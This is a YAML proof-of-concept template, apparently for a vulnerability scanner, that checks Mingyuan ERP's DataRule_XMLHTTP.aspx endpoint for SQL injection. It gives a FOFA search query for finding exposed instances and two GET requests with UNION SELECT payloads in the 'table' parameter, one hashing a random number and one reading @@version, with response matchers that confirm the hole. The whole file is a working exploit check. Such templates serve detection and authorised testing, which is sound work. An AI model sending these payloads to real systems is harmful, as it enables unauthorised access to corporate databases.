id: poc-yaml-mingyuanyun-erp-datarule-xmlhttp-aspx-sqli
info:
  name: 明源地产ERP DataRule_XMLHTTP.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 明源云ERP
  fofa: app="明源云-ERP"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
  expression: 'status_code == 200 &&

    contains(body,"0x" + t2) &&

    contains(body,"<items>")

    '
- method: GET
  path: /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version--
  expression: 'status_code == 200 &&

    contains(body,"Microsoft SQL Server") &&

    contains(body,"<items>")

    '
transport: http
